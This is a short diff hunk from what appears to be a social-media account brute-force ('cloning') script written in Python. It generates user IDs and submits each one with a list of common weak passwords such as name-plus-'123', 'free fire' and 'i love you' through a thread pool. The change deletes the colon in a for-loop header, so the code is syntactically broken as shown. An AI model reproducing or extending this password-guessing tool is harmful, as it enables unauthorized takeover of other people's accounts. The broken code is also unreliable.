@@ -207,7 +207,7 @@ def nahid_afridy():
         jalan(' ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄ WAIT A 5 MINUTES ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄')
         os.system('espeak -a 300 "Wait for 5 minutes"')
         print('')
-       for love in user:
+       for love in user
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','bangladesh','@@@@@@']
 			manshera.submit(b,uid,pwx,tl) 
